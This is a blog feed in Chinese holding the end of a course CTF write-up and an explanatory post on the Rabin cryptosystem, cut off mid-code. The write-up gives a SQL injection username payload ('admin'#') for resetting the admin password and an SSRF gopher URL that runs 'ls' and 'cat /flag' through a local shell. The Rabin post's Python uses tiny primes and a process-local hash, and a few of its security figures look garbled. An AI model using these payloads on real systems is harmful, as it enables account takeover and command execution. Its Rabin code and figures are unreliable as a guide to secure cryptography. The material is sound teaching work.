class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);  </span><br><span class="line">                <span class="variable">$row </span>= mysqli_affected_rows();  </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$row </span>= <span class="number">1</span>)&#123;  </span><br><span class="line">                    <span class="keyword">$this</span>-&gt;success(<span class="string">&#x27;修改成功啦&#x27;</span>,<span class="string">&#x27;/xinan/public/index/login/index&#x27;</span>);  </span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;  </span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;修改失败，请联系管理员&#x27;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="variable">$validate</span>-&gt;getError());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>注意黄色背景的SQL语句，存在明显的注入漏洞。我们可以设置用户名为<code>admin&#39;#</code> 这样SQL语句变为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>这样，<code>password=&#39;$curr_pass&#39;</code>语句将无法生效，我们就可以修改密码了。</p><p>首先，注册一个用户名为<code>admin&#39;#</code>的账号。因为系统要求密码长度不小于3，设置密码为111，注册成功。</p><p>下面登陆成功后，尝试修改密码。</p><p><img src="/img/95380a00f68c50746bb4c77841952905.png"></p><p>修改密码为111。尝试登录admin账号：</p><p><img src="/img/a4e48262b6cd98a9dcf1acdb6dc5bb7f.png"></p><p>登陆成功，得到hint。进入<code>http://111.200.241.244:50267/xinan/public/55ceedfbc97b0a81277a55506c34af36.php</code>，如图所示。</p><p><img src="/img/5eaecebe7ab408090b7570842a038e6c.png"></p><p>根据提示，这里应该是要使用SSRF中的Gopher协议。Gopher是Internet.上一个很有名的信息查找系统，它将Internet.上的文件组织成某种索引，很方便用户获取。Gopher协议使得Internet上的所有Gopher客户程序能够与已注册的Gopher服务器对话。使用格式是gopher://URL，在SSRF中经常会使用Gopher来构造GET/POST包攻击应用。</p><p>下面我们直接访问本地80端口的shell：</p><p><code>http://111.200.241.244:50267/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php?CMD=ls</code></p><p>但是回显Bad Request错误。查阅资料后发现Gopher协议要对符号进行二次url编码，例如<code>?</code>首先编码为<code>%3F</code>，再次编码为<code>%253F</code>，空格首先编码为<code>+</code>，再次编码为<code>%2B</code>。</p><p>因此首先输入<code>http://111.200.241.244:50267/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=ls</code>，显示如下：</p><p><img src="/img/952513946e7c57c998a9f2826a05df63.png"></p><p>不在当前目录，大概率在父目录。直接<code>cat /flag</code>即可。Payload：</p><p><code>http://111.200.241.244:50267/xinan/public/55ceedfbc97b0a81277a55506c34af36.php?url=gopher://127.0.0.1:80/_GET%20/xinan/public/shell.php%253Fcmd=cat%2B/flag</code></p><p><img src="/img/6c65e6ffed2f490e17cd85bbbecd6982.png"></p><h2 id="感想与小结"><a href="#感想与小结" class="headerlink" title="感想与小结"></a>感想与小结</h2><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;div class=&quot;note info flat&quot;&gt;&lt;p&gt;本文是《网络安全课程设计》的一项任务 (CTF Part 2)&lt;/p&gt;
&lt;/div&gt;

&lt;div class=&quot;note warning flat&quot;&gt;&lt;p&gt;下文的“难度”指攻防世界的题目星级，最高为10星&lt;/p&gt;
&lt;/</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://zxy.link/tags/CTF/"/>
    
    <category term="Web" scheme="https://zxy.link/tags/Web/"/>
    
    <category term="课程作业" scheme="https://zxy.link/tags/%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/"/>
    
    <category term="网络安全" scheme="https://zxy.link/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="攻防世界" scheme="https://zxy.link/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Rabin加密体制原理概述</title>
    <link href="https://zxy.link/posts/7b9d3851/"/>
    <id>https://zxy.link/posts/7b9d3851/</id>
    <published>2021-12-29T09:25:01.000Z</published>
    <updated>2022-01-22T12:41:29.288Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Rabin 密码系统是第一个非对称密码系统，由<a href="https://en.wikipedia.org/wiki/Michael_O._Rabin">Michael Oser Rabin</a>于1979年在论文*<a href="http://publications.csail.mit.edu/lcs/pubs/pdf/MIT-LCS-TR-212.pdf">Digitalized Signatures and Public-Key Functions as Intractable as Factorization</a>*中发表。可以证明从密文中恢复明文与分解一样困难，它的安全性来源于大整数的因子分解。优点：</p><ol><li><p> Rabin 函数的每个输出都可以由四个可能的输入中的任何一个生成</p></li><li><p> 如果每个输出都是密文，则解密时需要额外的复杂性来识别四个可能的输入中的哪一个是真正的明文</p></li></ol><h3 id="密钥生成算法"><a href="#密钥生成算法" class="headerlink" title="密钥生成算法"></a>密钥生成算法</h3><p>Rabin密码系统的密钥生成如下：</p><p>1. 选择两个不同的大素数 𝑝 和 𝑞 ，并且满足 𝑝≡3 mod 4和 𝑞≡3 mod 4</p><p>2. 计算 𝑛 = 𝑝×𝑞.</p><p>将 𝑝 和 𝑞 作为私钥，<em>n</em> 作为公钥。</p><p>一个消息 <em>M</em> 首先转换为数字 <em>m</em> (<em>m &lt; n,</em> 可逆映射)，然后计算. 密文为 <em>c</em> .</p><p>消息 <em>m</em> 可以从密文中 <em>c</em> 通过取其平方根模 <em>n</em> 如下。<br>$$<br>\begin{equation}<br>\begin{aligned}<br>&amp;m_{p 1}=c^{\frac{1}{4}(p+1)} \bmod p, \ m_{p 2}=\left(p-m_{p 1}\right) \bmod p \\<br>&amp;m_{q 1}=c^{\frac{1}{4}(q+1)} \bmod q, \ m_{q 2}=\left(q-m_{q 1}\right) \bmod q<br>\end{aligned}<br>\end{equation}<br>$$<br>求出四个 <em>m</em> 后两两使用中国剩余定理求解，则得到消息 <em>m</em> 的四个可行解。</p><p>这四个值之一是原始明文 <em>m</em>，在没有额外信息的情况下无法确定这四个中的哪一个是正确的。如果明文意在代表一条短信，猜测不难；然而，如果明文旨在表示一个数值，这个问题就成为一个必须通过某种消歧方案来解决的问题。可以选择具有特殊结构的明文，或者添加<em>padding</em>（填充）来消除这个问题。这是 Rabin 密码系统的主要缺点。</p><h3 id="模-p-平方根证明"><a href="#模-p-平方根证明" class="headerlink" title="模 p 平方根证明"></a>模 <em>p</em> 平方根证明</h3><p>因为 <em>p</em> 是形如素数，所以存在奇数 <em>s</em> 使得即<br>$$<br>\begin{equation}<br>p-1=2s<br>\end{equation}<br>$$<br>现在同余式<br>$$<br>\begin{equation}<br>m^2\equiv c\ (mod\ p)<br>\end{equation}<br>$$<br>有解，则根据欧拉判别条件，有<br>$$<br>\begin{equation}<br>c^\frac{p-1}{2}\equiv c^s\equiv1\ (mod\ p)<br>\end{equation}<br>$$</p><p>两端同时乘以 <em>c</em> 得到<br>$$<br>\begin{equation}<br>c^{s+1}\equiv{(c^\frac{s+1}{2})}^2\equiv{(c^\frac{\frac{p-1}{2}+1}{2})}^2\equiv{(c^\frac{p+1}{4})}^2\equiv c\ (mod\ p)<br>\end{equation}<br>$$<br>因此，同余式的解为<br>$$<br>\begin{equation}<br>m \equiv \pm c^{\frac{p+1}{4}}(mod\ p)<br>\end{equation}<br>$$</p><h2 id="Rabin加密体制拓展分析"><a href="#Rabin加密体制拓展分析" class="headerlink" title="Rabin加密体制拓展分析"></a>Rabin加密体制拓展分析</h2><h3 id="Rabin算法安全性能与效率分析"><a href="#Rabin算法安全性能与效率分析" class="headerlink" title="Rabin算法安全性能与效率分析"></a>Rabin算法安全性能与效率分析</h3><h4 id="（1）效率高"><a href="#（1）效率高" class="headerlink" title="（1）效率高"></a>（1）效率高</h4><p>RSA，ElGamal，的主要操作是模幂运算。该操作具有相当大的时间复杂度，这导致在实现非对称加密算法时效率降低。在Rabin密码系统中使用模块平方运算来生成加密文本，与其他非对称密码算法相比，这大大加快了加密过程，而不影响密码系统的安全性。Rabin<br>选择的加密指数 <em>e</em> = 2 很小, 因此, 加密速度相对较快, 可应用于软件产品。</p><h4 id="（2）安全性强"><a href="#（2）安全性强" class="headerlink" title="（2）安全性强"></a>（2）安全性强</h4><p>1）求 <em>x</em>2 ≡ <em>y</em> (<em>mod n</em>) 等价于求<em>n</em> 的因子分解的困难性，根据目前大数分解的进展情况, 分解 <em>n</em> =2375的因数，大致要在亿次机上不间断的运行六十多年。</p><p>2）Rabin 解密过程基于求平方根的问题，Rabin密码系统对黑客攻击的抵抗，还涉及到模幂运算和解中国剩余定理，这两种程序都具有次指数时间复杂度，因此, 解密是比较困难的。</p><h4 id="（3）与RSA相比较"><a href="#（3）与RSA相比较" class="headerlink" title="（3）与RSA相比较"></a>（3）与RSA相比较</h4><p>RSA和Rabin的密码系统非常相似。两者都是基于因子分解的难度。主要区别在于，Rabin的密码系统等价于求整数因子分解一样困难，而解决RSA问题的方法还没达到因子分解的难度，这使得Rabin密码系统更加这样比RSA更安全。另一个区别是攻击的风险。Rabin密码系统对选择明文攻击是安全的，但是系统可能会被密码文本攻击破坏使攻击者能够知道私钥。RSA也是易受选定密文攻击，但私钥永远都是未知的。</p><h4 id="（4）对于被动攻击是安全的"><a href="#（4）对于被动攻击是安全的" class="headerlink" title="（4）对于被动攻击是安全的"></a>（4）对于被动攻击是安全的</h4><p>作为被动攻击者的任务是从密文消息<em>c</em>恢复出明文消息<em>m</em>。这就是平方根SQROOT问题。分解<em>n</em>和计算模<em>n</em>的平方根问题在计算上是等价的。因此，假定分解<em>n</em>在计算上不可能，Rabin公钥加密方案就可以证明能够抵抗被动攻击者的攻击。</p><h3 id="破解攻击"><a href="#破解攻击" class="headerlink" title="破解攻击"></a>破解攻击</h3><h4 id="有关Rabin的可能攻击"><a href="#有关Rabin的可能攻击" class="headerlink" title="有关Rabin的可能攻击"></a>有关Rabin的可能攻击</h4><p>1）利用整数的因子分解</p><p>防范：选择<em>p</em>和<em>q</em>使得分解<em>n</em>是不可行的。</p><p>2）利用Rabin的乘性质</p><p>防范：冗余函数<em>R</em>是非乘性的。</p><h4 id="对于选择密文攻击是不安全的"><a href="#对于选择密文攻击是不安全的" class="headerlink" title="对于选择密文攻击是不安全的"></a>对于选择密文攻击是不安全的</h4><p>对于主动攻击者，Rabin公钥加密存在选择密文攻击问题。这样的攻击可以按如下步骤进行。攻击者选择一个随机整数<em>m</em>并计算<em>c ≡ m2 (mod n)<em>。攻击者提交 <em>c</em> 给 <em>A</em> 的解密机，它将解密</em>c</em>并返回某个明文消息<em>y</em>。由于<em>A</em>不知道明文消息<em>m</em>，并且<em>m</em>为随机选择，明文消息y未必就是同一个消息<em>m</em>。如果随机返回，将有1/2可能性，<em>y</em>不等于±<em>m</em> (<em>mod n</em>)，在这种情况下，(<em>m-y，n</em>)就是<em>n</em>的一个素数因子。否则，攻击者可以换新的<em>m</em>重复以上过程。</p><h4 id="针对选择密文攻击改进"><a href="#针对选择密文攻击改进" class="headerlink" title="针对选择密文攻击改进"></a>针对选择密文攻击改进</h4><p>冗余规则：Rabin公钥加密方案的一个缺点是接收者需要从4种可能情况中选择一个正确的解密明文消息。这一解密中的不确定问题在实践中可以通过预先增加定义原始明文消息冗余来解决。(例如,明文消息的最后64比特需要被复制。)这样,将有非常高的概率解密出来的4个可能明文消息中仅有一个符合冗余的规则。如果4个平方根中没有一个符合冗余规则,则接收者就认为出错而拒绝密文消息。</p><p>如果将冗余规则用于以上情况,则Rabin公钥加密方案将不再存在选择密文攻击问题。如果攻击者选择一条消息<em>m</em>并具有规定的冗余并将<em>c≡ m2(mod n)<em>提交给</em>A</em>的加密机,加密机将以非常高的概率返回消息<em>m</em>本身给攻击者(由于其它3个<em>c</em>的模平方根有非常大的概率不包含规定的冗余),则将不会提供给攻击者任何信息。另一方面,如果攻击者选择不包含冗余的消息<em>m</em>，则有非常高的可能性4个模平方根都不具有需要的冗余形式。在这种情况下,解密机将认为对<em>c</em>的解密失败并对攻击者不做答复。因此，Rabin公钥加密通过对增加适当的冗余规则将提高其实用价值。</p><h2 id="Rabin加密体制代码编写与优化"><a href="#Rabin加密体制代码编写与优化" class="headerlink" title="Rabin加密体制代码编写与优化"></a>Rabin加密体制代码编写与优化</h2><h3 id="Rabin-p算法"><a href="#Rabin-p算法" class="headerlink" title="Rabin-p算法"></a>Rabin-<em>p</em>算法</h3><h4 id="Rabin-p公钥密码体制"><a href="#Rabin-p公钥密码体制" class="headerlink" title="Rabin-p公钥密码体制"></a>Rabin-<em>p</em>公钥密码体制<img src="/img/fe1ee1e7ad8299a98f7c9f3350acad5a.png"></h4><p><img src="/img/4dc59f186daa1718ad77b2d7eccb7a04.png"><img src="/img/65111070d8135263c06085aa2e6c18ce.png"></p><h3 id="Rabin-p运行资源消耗"><a href="#Rabin-p运行资源消耗" class="headerlink" title="Rabin-p运行资源消耗"></a>Rabin-<em>p</em>运行资源消耗</h3><h4 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a><strong>Encryption</strong></h4><p><strong><img src="/img/5b62690f54713ae2de9da7c39dd43007.png"><img src="/img/53bd599d4c8782c1ece1bb846a7fc339.png"></strong></p><h4 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a><strong>Decryption</strong></h4><p><img src="/img/22106af01cf061bd0064944a8c6765d9.bin"><img src="/img/7afd745cf5f33f13ead2ee9b2b88a7a8.png"></p><h3 id="Rabin-p运行时间消耗"><a href="#Rabin-p运行时间消耗" class="headerlink" title="Rabin-p运行时间消耗"></a>Rabin-<em>p</em>运行时间消耗</h3><h4 id="与其它算法时间的对比"><a href="#与其它算法时间的对比" class="headerlink" title="与其它算法时间的对比"></a>与其它算法时间的对比</h4><p><img src="/img/bf8ddd2b0051b1896388fa827dfbcf4a.png" alt="image-20220121200003948"></p><p><em>FIGURE 1. Encryption Running Time using k of 341, 682 and 1365-bit</em></p><p><img src="/img/28bf3b9f66358fb67bf6b16d5bcc9fca.png" alt="image-20220121200146795"></p><p><em>FIGURE 2. Decryption Running Time using k of 341, 682 and 1365-bit</em></p><p><strong>运行时间</strong></p><p><img src="/img/ad0a9492a594c86b2399954311581132.png"></p><h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><h4 id="Rabin加密体制"><a href="#Rabin加密体制" class="headerlink" title="Rabin加密体制"></a>Rabin加密体制</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#素数判定函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#秘钥生成函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_getkeys</span>():</span></span><br><span class="line">    pks=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">1100</span>) <span class="keyword">if</span> isPrime(i) <span class="keyword">and</span> i%<span class="number">4</span>==<span class="number">3</span>]</span><br><span class="line">    p=random.choice(pks)</span><br><span class="line">    q=random.choice(pks)</span><br><span class="line">    <span class="keyword">while</span> p==q:</span><br><span class="line">        q=random.choice(pks)</span><br><span class="line">    key=p*q</span><br><span class="line">    keys=[p,q,key]</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_encode</span>(<span class="params">message,key</span>):</span></span><br><span class="line">    plaintext=message</span><br><span class="line">    ciphertext=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>(<span class="built_in">hash</span>(<span class="built_in">str</span>(<span class="built_in">ord</span>(i))))) <span class="comment"># 加入hash标识(当然仅仅是在同一个程序进程中才有效，python内置hash的函数是将str的储存地址当作标时进行转换的，不同进程的相同字符的地址不一样，当然可换成其它类型的hash函数)</span></span><br><span class="line">        ciphertext.append(<span class="built_in">str</span>((<span class="built_in">ord</span>(i))*(<span class="built_in">ord</span>(i))%key))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_decode</span>(<span class="params">message,p,q</span>):</span></span><br><span class="line">    ciphertext=message</span><br><span class="line">    plaintext=[]</span><br><span class="line">    temp=<span class="number">0</span></span><br><span class="line">    <span class="comment"># 拓展欧几里得</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(p):</span><br><span class="line">        <span class="keyword">if</span> (i*q)%p==<span class="number">1</span>:</span><br><span class="line">            temp=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    a=q*temp</span><br><span class="line">    temp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q):</span><br><span class="line">        <span class="keyword">if</span> (i*p)%q==<span class="number">1</span>:</span><br><span class="line">            temp=i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    b=p*temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span>: <span class="comment"># 略过hash标识</span></span><br><span class="line">            m_temp=[]</span><br><span class="line">            m=[]</span><br><span class="line">            m_temp.append(<span class="built_in">pow</span>(<span class="built_in">int</span>(ciphertext[i]),(p+<span class="number">1</span>)//<span class="number">4</span>)%p) <span class="comment">#这里要用// 整数除法</span></span><br><span class="line">            m_temp.append(p-<span class="built_in">pow</span>(<span class="built_in">int</span>(ciphertext[i]),(p+<span class="number">1</span>)//<span class="number">4</span>)%p)</span><br><span class="line">            m_temp.append(<span class="built_in">pow</span>(<span class="built_in">int</span>(ciphertext[i]),(q+<span class="number">1</span>)//<span class="number">4</span>)%q)</span><br><span class="line">            m_temp.append(q-<span class="built_in">pow</span>(<span class="built_in">int</span>(ciphertext[i]),(q+<span class="number">1</span>)//<span class="number">4</span>)%q)</span><br><span class="line">            <span class="comment"># 中国剩余定理</span></span><br><span class="line">            m.append((a*m_temp[<span class="number">0</span>]+b*m_temp[<span class="number">2</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">0</span>]+b*m_temp[<span class="number">3</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">1</span>]+b*m_temp[<span class="number">2</span>])%(p*q))</span><br><span class="line">            m.append((a*m_temp[<span class="number">1</span>]+b*m_temp[<span class="number">3</span>])%(p*q))</span><br><span class="line">            <span class="keyword">for</span> each_m <span class="keyword">in</span> m:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">hash</span>(<span class="built_in">str</span>(each_m))==<span class="built_in">int</span>(ciphertext[i-<span class="number">1</span>]):</span><br><span class="line">                    plaintext.append(<span class="built_in">chr</span>(each_m))</span><br><span class="line">                    <span class="keyword">break</span> <span class="comment">#要break，否则值重复</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.perf_counter()</span><br><span class="line">    keys=Rabin_getkeys() <span class="comment"># 生成公钥密钥</span></span><br><span class="line">    <span class="built_in">print</span> (keys)  <span class="comment">#打印公钥与私钥，前两位为私钥用于解密，最后一位为公钥，用于加密</span></span><br><span class="line">    message=<span class="string">&quot;Hello,rabin&quot;</span></span><br><span class="line">    cipher=Rabin_encode(message,keys[-<span class="number">1</span>]) <span class="comment"># 生成密文</span></span><br><span class="line">    <span class="built_in">print</span>(cipher)</span><br><span class="line">    <span class="built_in">print</span>(Rabin_decode(cipher,keys[<span class="number">0</span>],keys[<span class="number">1</span>]))  <span class="comment">#打印解密结果</span></span><br><span class="line">    end = time.perf_counter()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;运行时间&quot;</span>, end - start)</span><br></pre></td></tr></table></figure><h4 id="Rabin加密体制-改进"><a href="#Rabin加密体制-改进" class="headerlink" title="Rabin加密体制-改进"></a>Rabin加密体制-改进</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 使用了Miller_Rabin和快速幂进行优化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#素数判定函数</span></span><br><span class="line"><span class="comment"># Miller_Rabin 法判定是否为素数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_power_mod</span>(<span class="params">base, power, n</span>):</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    tmp = base</span><br><span class="line">    <span class="keyword">while</span> power &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> power&amp;<span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            result = (result * tmp) % n</span><br><span class="line">        tmp = (tmp * tmp) % n </span><br><span class="line">        power = power&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_power</span>(<span class="params">base, power</span>):</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    tmp = base</span><br><span class="line">    <span class="keyword">while</span> power &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> power&amp;<span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            result = (result * tmp)</span><br><span class="line">        tmp = (tmp * tmp)</span><br><span class="line">        power = power&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Miller_Rabin</span>(<span class="params">p</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    m, k = p - <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> m % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        m, k = m // <span class="number">2</span>, k + <span class="number">1</span></span><br><span class="line">    a = random.randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">    x = fast_power_mod(a, m, p)</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">or</span> x == p - <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> k &gt; <span class="number">1</span>:</span><br><span class="line">        x = fast_power_mod(x, <span class="number">2</span>, p)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> x == p - <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        k = k - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#秘钥生成函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rabin_getkeys</span>():</span></span><br><span class="line">    pks=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">1100</span>) <span class="keyword">if</span> Miller_Rabin(i) <span class="keyword">and</span> i%<span class="number">4</span>==<span 